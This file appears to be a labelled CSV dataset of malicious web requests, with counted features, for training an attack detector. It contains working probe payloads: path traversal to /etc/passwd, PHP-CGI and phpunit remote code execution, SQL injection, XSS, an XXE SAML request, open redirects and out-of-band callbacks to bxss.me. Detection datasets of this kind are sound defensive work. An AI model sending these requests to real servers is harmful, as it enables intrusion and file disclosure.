method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/blog/wp-admin/setup-config.php,,0,0,0,0,0,0,bad
GET,/48sTxnorJ5.cfm,,0,0,0,0,0,0,bad
GET,/admin/,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/coredumpcheck.php,,0,0,0,0,0,0,bad
GET,/cgi-bin/welcome.cgi,,0,0,0,0,0,0,bad
GET,/elmah.axd,,0,0,0,0,0,0,bad
GET,/1cZrli3G,,0,0,0,0,0,0,bad
GET,/perl-status,,0,0,0,0,0,0,bad
GET,/varz,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR,,0,0,0,0,0,0,bad
GET,/CFIDE/administrator/index.cfm,,0,0,0,0,0,0,bad
GET,/?__debugger__=yes&cmd=resource&f=debugger.js,,0,0,0,0,0,0,bad
GET,/db.sql,,0,0,0,0,0,0,bad
GET,/_vti_inf.html,,0,0,0,0,0,0,bad
POST,/_vti_bin/shtml.exe?_vti_rpc,method=open+service:3.0.2.1105&service_name=/,0,0,0,0,0,0,bad
GET,/eureka/,,0,0,0,0,0,0,bad
GET,/?url=http://demo.testfire.net&next=http://demo.testfire.net&to=http://demo.testfire.net&view=http://demo.testfire.net&forward=http://demo.testfire.net&dest=http://demo.testfire.net&destination=http://demo.testfire.net&redirect=http://demo.testfire.net&uri=http://demo.testfire.net&path=http://demo.testfire.net,,0,0,0,0,0,0,bad
GET,/cgi-bin/jarrewrite.sh,,0,0,0,0,0,0,bad
GET,/common/index.jsf,,0,0,0,0,0,0,bad
GET,/_vti_pvt/authors.pwd,,0,0,0,0,0,0,bad
GET,/browseDirectory.jsp,,0,0,0,0,0,0,bad
GET,/vmqwedtwuq?cb352268=1,,0,0,0,0,0,0,bad
GET,/create.sql,,0,0,0,0,0,0,bad
GET,/horde/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00,,0,0,0,0,0,0,bad
POST,/_vti_bin/_vti_aut/author.dll,method=open+service:3.0.2.1105&service_name=/,0,0,0,0,0,0,bad
GET,/?continue=http://demo.testfire.net&window=http://demo.testfire.net&out=http://demo.testfire.net&navigation=http://demo.testfire.net&domain=http://demo.testfire.net&return=http://demo.testfire.net&redirection_url=http://demo.testfire.net&redirect_uri=http://demo.testfire.net&host=http://demo.testfire.net&domain_name=http://demo.testfire.net,,0,0,0,0,0,0,bad
GET,/cgi-bin/welcome,,0,0,0,0,0,0,bad
GET,/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd,,0,0,0,0,0,0,bad
GET,/admin/elmah.axd,,0,0,0,0,0,0,bad
GET,/vmqwedtwuq?cb352268=1,,0,0,0,0,0,0,bad
GET,/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00,,0,0,0,0,0,0,bad
GET,/ibm/console/logon.jsp,,0,0,0,0,0,0,bad
GET,/dump.sql,,0,0,0,0,0,0,bad
GET,/wps/wcm/connect/'+or+'8MAhZ'='8MAhZ,,4,0,0,0,2,0,bad
GET,/CGI/Java/Serviceability,,0,0,0,0,0,0,bad
GET,/administrator.cgi,,0,0,0,0,0,0,bad
GET,/Global.asa.bak,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.php,,0,0,0,0,0,0,bad
GET,/dbdump.sql,,0,0,0,0,0,0,bad
GET,/bnwtislfzp?cb057453=1,,0,0,0,0,0,0,bad
GET,/theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini,,0,0,0,0,0,0,bad
GET,/long_inexistent_path12345_/Null.htw?CiWebhitsfile=:&CiRestriction=b&CiHiliteType=full,,0,0,0,0,0,0,bad
GET,/admin.cgi,,0,0,0,0,0,0,bad
GET,/loader-wizard.php?page=phpinfo,,0,0,0,0,0,0,bad
GET,/?redir=http://demo.testfire.net&wp_http_referer=http://demo.testfire.net&endpoint=http://demo.testfire.net&fallback=http://demo.testfire.net&ref_url=http://demo.testfire.net&state=http://demo.testfire.net&l=http://demo.testfire.net&return_to=http://demo.testfire.net&redirect_url=http://demo.testfire.net&return_url=http://demo.testfire.net,,0,0,0,0,0,0,bad
GET,/_vti_pvt/service.cnf,,0,0,0,0,0,0,bad
GET,/monitorix/,,0,0,0,0,0,0,bad
GET,/database.sql,,0,0,0,0,0,0,bad
GET,/jfDOxNj6,,0,0,0,0,0,0,bad
GET,/Global.asax.bak,,0,0,0,0,0,0,bad
GET,/install.php?profile=default,,0,0,0,0,0,0,bad
GET,/ioncube/loader-wizard.php?page=phpinfo,,0,0,0,0,0,0,bad
GET,/tjtkuquhal?cb429359=1,,0,0,0,0,0,0,bad
GET,/web-console/Invoker,,0,0,0,0,0,0,bad
GET,/cgi-bin/admin.cgi,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.cgi,,0,0,0,0,0,0,bad
GET,/w2kvhg0A.jsp,,0,0,0,0,0,0,bad
GET,/core/install.php,,0,0,0,0,0,0,bad
GET,/monitorix-cgi/monitorix.cgi,,0,0,0,0,0,0,bad
GET,/web-console/,,0,0,0,0,0,0,bad
GET,/jbossws/services,,0,0,0,0,0,0,bad
GET,/status?full=true,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.pl,,0,0,0,0,0,0,bad
GET,/drupal/install.php?profile=default,,0,0,0,0,0,0,bad
GET,/backup.sql,,0,0,0,0,0,0,bad
GET,/cgi-bin/FormHandler.cgi,,0,0,0,0,0,0,bad
POST,/login.jsp,,0,0,0,0,0,0,bad
GET,/?redirectto=http://demo.testfire.net&redirect_to=http://demo.testfire.net&succUrl=http://demo.testfire.net&file=http://demo.testfire.net&link=http://demo.testfire.net&referrer=http://demo.testfire.net&u=http://demo.testfire.net&hostname=http://demo.testfire.net&returnTo=http://demo.testfire.net&return_path=http://demo.testfire.net,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.plx,,0,0,0,0,0,0,bad
GET,/web-console/status?full=true,,0,0,0,0,0,0,bad
GET,/yabysfyvij?cb519322=1,,0,0,0,0,0,0,bad
GET,/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfo,,0,0,0,0,0,1,bad
GET,/admin/db.sql,,0,0,0,0,0,0,bad
GET,/,,0,0,0,0,0,0,bad
GET,/?requestTokenAndRedirect=http://demo.testfire.net&retURL=http://demo.testfire.net&rurl=http://demo.testfire.net&next_url=http://demo.testfire.net&callback=http://demo.testfire.net&site=http://demo.testfire.net&go=http://demo.testfire.net,,0,0,0,0,0,0,bad
GET,/cgi-bin/FormMail.cgi,,0,0,0,0,0,0,bad
GET,/piwik/index.php?module=CoreHome&action=index&idSite=2&period=day&date=today,,0,0,0,0,0,0,bad
GET,/Qnm4L0gK.do,,0,0,0,0,0,0,bad
GET,/console/images/%252e%252e%252f/console.portal?_nfpb=true&_pageLabel=&handle=1,,0,0,0,0,0,0,bad
GET,/manager/status/all,,0,0,0,0,0,0,bad
GET,/matomo/index.php,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.exe,,0,0,0,0,0,0,bad
GET,/admin/create.sql,,0,0,0,0,0,0,bad
GET,/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServer,,0,0,0,0,0,1,bad
GET,/,,0,0,0,0,0,0,bad
GET,/AdminCaptureRootCA,,0,0,0,0,0,0,bad
GET,/cgi-bin/guestbook.cgi,,0,0,0,0,0,0,bad
GET,/zhngmqyhmo?cb237740=1,,0,0,0,0,0,0,bad
GET,/pagespeed_admin/,,0,0,0,0,0,0,bad
POST,/mt/mt-upgrade.cgi,"__mode=run_actions&installing=1&steps=[[""core_drop_meta_for_table"",""class"",""0hZXPb4TaN""]]",0,6,0,0,0,1,bad
GET,/admin/dump.sql,,0,0,0,0,0,0,bad
GET,/AdminClients,,0,0,0,0,0,0,bad
GET,/solr/admin/,,0,0,0,0,0,0,bad
GET,/_layouts/scriptresx.ashx?culture=en-us&name=SP.JSGrid.Res&rev=laygpE0lqaosnkB4iqx6mA%3D%3D&sections=All<script>alert(12345)</script>z,,0,0,0,1,0,0,bad
GET,/servlet/%0ARefresh:0;URL=javascript:prompt(1)%0A1,,0,0,0,1,0,0,bad
GET,/pagespeed_global_admin/,,0,0,0,0,0,0,bad
GET,/admin/dbdump.sql,,0,0,0,0,0,0,bad
GET,/analytics/index.php,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.asp,,0,0,0,0,0,0,bad
GET,/cgi-bin/search.cgi,,0,0,0,0,0,0,bad
GET,/solr/admin/,,0,0,0,0,0,0,bad
GET,/sqlnet.log,,0,0,0,0,0,0,bad
GET,/$sitepreview/localhost:2006/Wizard/,,0,0,0,0,0,0,bad
GET,/dqnfamyzpd?cb244391=1,,0,0,0,0,0,0,bad
GET,/mod_pagespeed_statistics,,0,0,0,0,0,0,bad
GET,/jmx-console/,,0,0,0,0,0,0,bad
POST,/phpMoAdmin/moadmin.php,object=1;print(md5(31337));exit,0,0,0,2,0,0,bad
POST,/cgi/mt/mt-upgrade.cgi,"__mode=run_actions&installing=1&steps=[[""core_drop_meta_for_table"",""class"",""0hZXPb4TaN""]]",0,6,0,0,0,1,bad
GET,/AdminConnections,,0,0,0,0,0,0,bad
POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,<?php die(print(md5(126)));,0,0,0,3,1,0,bad
GET,/reports/rwservlet?report=test.rdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER=%22http://bxss.me/rpb.png%22,,0,2,0,0,4,0,bad
POST,/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/admin/database.sql,,0,0,0,0,0,0,bad
POST,/phpmoadmin/moadmin.php,object=1;print(md5(31337));exit,0,0,0,2,0,0,bad
GET,/cgi-sys/addalink.cgi,,0,0,0,0,0,0,bad
POST,/enterprise/control/agent.php,"<?xml version=""1.0"" encoding=""UTF-8"" ?><packet version=""1.5.0.0""><ip><get/></ip></packet>",0,6,0,0,4,0,bad
GET,/listener.log,,0,0,0,0,0,0,bad
GET,/piwik/index.php,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.aspx,,0,0,0,0,0,0,bad
POST,/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/admin/backup.sql,,0,0,0,0,0,0,bad
GET,/proberv.php,,0,0,0,0,0,0,bad
GET,/reports/rwservlet/showenv,,0,0,0,0,0,0,bad
GET,/AdminEvents,,0,0,0,0,0,0,bad
POST,/relay,SAMLRequest=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI%2FPjwhRE9DVFlQRSBkb2MgWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdID4KPHNhbWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0iZGZmNTc4YzMwNDlmNWJhMTAyMjNkZjgyMDEyM2ZjY2NiYzEzNGU3NTIwIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNC0wNS0wOFQxMTo1ODozM1oiIERlc3RpbmF0aW9uPSJqYXZhc2NyaXB0OnByb21wdChkb2N1bWVudC5kb21haW4sZG9jdW1lbnQuY29va2llKSI%2BIDxzYW1sOklzc3Vlcj4meHhlOzwvc2FtbDpJc3N1ZXI%2BIDxzYW1scDpFeHRlbnNpb25zPiA8VUk%2BPFVSTD4meHhlOzwvVVJMPjwvVUk%2BIDwvc2FtbHA6RXh0ZW5zaW9ucz4gPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BIDxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8%2BIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz4gPGRzOlJlZmVyZW5jZSBVUkk9IiNkZmY1NzhjMzA0OWY1YmExMDIyM2RmODIwMTIzZmNjY2JjMTM0ZTc1MjAiPjxkczpUcmFuc2Zvcm1zPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjZW52ZWxvcGVkLXNpZ25hdHVyZSIvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48L2RzOlRyYW5zZm9ybXM%2BPGRzOkRpZ2VzdE1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNzaGExIi8%2BPGRzOkRpZ2VzdFZhbHVlPjVCV2l5WDl6dkFDR1I1eStOQjJ3eHVYSnRKRT08L2RzOkRpZ2VzdFZhbHVlPjwvZHM6UmVmZXJlbmNlPjwvZHM6U2lnbmVkSW5mbz48ZHM6U2lnbmF0dXJlVmFsdWU%2BUzRMaENVT0IweWxUNGNqWFVWQWJudnJCakJCenliYXh2V0hUR3c5Sm5Sc3lVQjFNZXRSSytWSHZWL00zUTROWDBER1VORlhsQ1pSM3NNMm1zUU9BaGJqWnhrS1FDTlVCaWc1Ni8wM3Bnc1hscFdKRmhuQkw4bTBzUlJaQmR1ZjRRZEhuL2h4eHl2QUt6YWRQUTVubUlQbUNQcE8xQ1FzUlVUTXJ0LzEzVklFPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BIDwvZHM6U2lnbmF0dXJlPjwvc2FtbHA6QXV0aG5SZXF1ZXN0Pg%3D%3D&response_url=http%3A%2F%2Fhax&RelayState=aHR0cHM6Ly9uczM2NTMyOS5vdmgubmV0Ojg0NDMv&RefererScheme=https&RefererHost=https%3A%2F%2FX.com%3A8443&RefererPort=8443,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.phtml,,0,0,0,0,0,0,bad
GET,/cgi-sys/entropybanner.cgi,,0,0,0,0,0,0,bad
GET,/status?json&full,,0,0,0,0,0,0,bad
GET,/invoker/JMXInvokerServlet,,0,0,0,0,0,0,bad
POST,/phpunit/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,<?php die(print(md5(985)));,0,0,0,3,1,0,bad
POST,/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/2eV6ULgPTtDjSd8d,,0,0,0,0,0,0,bad
GET,/iProber2.php,,0,0,0,0,0,0,bad
GET,/railo-context/admin/update.cfm?ADMINTYPE=admin<svg/onload=alert(1)>,,0,0,0,1,0,0,bad
GET,/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir,,0,0,0,0,0,0,bad
GET,/dokuwiki/install.php,,0,0,0,0,0,0,bad
GET,/demo.sql,,0,0,0,0,0,0,bad
GET,/AdminJDBC,,0,0,0,0,0,0,bad
GET,/ping?json&full,,0,0,0,0,0,0,bad
GET,/@bxss.me/rpb.png,,0,0,0,0,0,0,bad
GET,/cgi-sys/entropysearch.cgi,,0,0,0,0,0,0,bad
POST,/moadmin/moadmin.php,object=1;print(md5(31337));exit,0,0,0,2,0,0,bad
GET,/snoop.jsp,,0,0,0,0,0,0,bad
GET,/iProber3.php,,0,0,0,0,0,0,bad
GET,/browseDirectory.jsp,,0,0,0,0,0,0,bad
GET,/database.yml,,0,0,0,0,0,0,bad
GET,/invoker/EJBInvokerServlet,,0,0,0,0,0,0,bad
GET,/server-status?json&full,,0,0,0,0,0,0,bad
GET,/register.html,,0,0,0,0,0,0,bad
POST,/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/AdminLicense,,0,0,0,0,0,0,bad
GET,/oauth/authorize?response_type=token&client_id=acme&redirect_uri=${333333*3},,0,0,0,0,0,0,bad
GET,/master-status,,0,0,0,0,0,0,bad
GET,/database.yml_original,,0,0,0,0,0,0,bad
GET,/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployer:service%3DBSHDeployer,,0,0,0,0,0,0,bad
GET,/examples/jsp/snp/snoop.jsp,,0,0,0,0,0,0,bad
GET,/cgi-bin/printenv.pl,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.jhtml,,0,0,0,0,0,0,bad
POST,/cgi-bin/php4.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/wiki/install.php,,0,0,0,0,0,0,bad
GET,/DTNVZWu4z1.jsp,,0,0,0,0,0,0,bad
GET,/cgi-sys/defaultwebpage.cgi,,0,0,0,0,0,0,bad
GET,/demodb.sql,,0,0,0,0,0,0,bad
GET,/manager/html/,,0,0,0,0,0,0,bad
GET,/examples/servlet/SnoopServlet,,0,0,0,0,0,0,bad
GET,/cgi-bin/status.pl,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.shtml,,0,0,0,0,0,0,bad
POST,/cgi-bin/php4-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/install,,0,0,0,0,0,0,bad
GET,/examples/jsp/%252e%252e/%252e%252e/manager/html/,,0,0,0,0,0,0,bad
GET,/register.cgi,,0,0,0,0,0,0,bad
GET,/health,,0,0,0,0,0,0,bad
GET,/servlet/SnoopServlet,,0,0,0,0,0,0,bad
GET,/perl/printenv.pl,,0,0,0,0,0,0,bad
GET,/yzBRXFyXAR.nsf,,0,0,0,0,0,0,bad
POST,/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E,<?php echo(md5('testing-php-cgi-rce')); ?>,2,2,0,2,18,0,bad
GET,/phpfpm_status?json&full,,0,0,0,0,0,0,bad
GET,/tomcat-docs/appdev/sample/web/hello.jsp?test=<script>alert(12345)</script>,,0,0,0,1,0,0,bad
GET,/database.yml~,,0,0,0,0,0,0,bad
GET,/job-overview,,0,0,0,0,0,0,bad
GET,/j2ee/servlet/SnoopServlet,,0,0,0,0,0,0,bad
GET,/AdminMain,,0,0,0,0,0,0,bad
GET,/:@bxss.me/rpb.png,,0,0,0,0,0,0,bad
GET,/osticket/setup/index.php,,0,0,0,0,0,0,bad
GET,/cgi-sys/FormMail-clone.cgi,,0,0,0,0,0,0,bad
GET,/register.asp,,0,0,0,0,0,0,bad
GET,/database.yml.pgsql,,0,0,0,0,0,0,bad
GET,/phpmyadmin/main.php,,0,0,0,0,0,0,bad
GET,/examples/servlets/index.html,,0,0,0,0,0,0,bad
GET,/cgi-bin/test.cgi,,0,0,0,0,0,0,bad
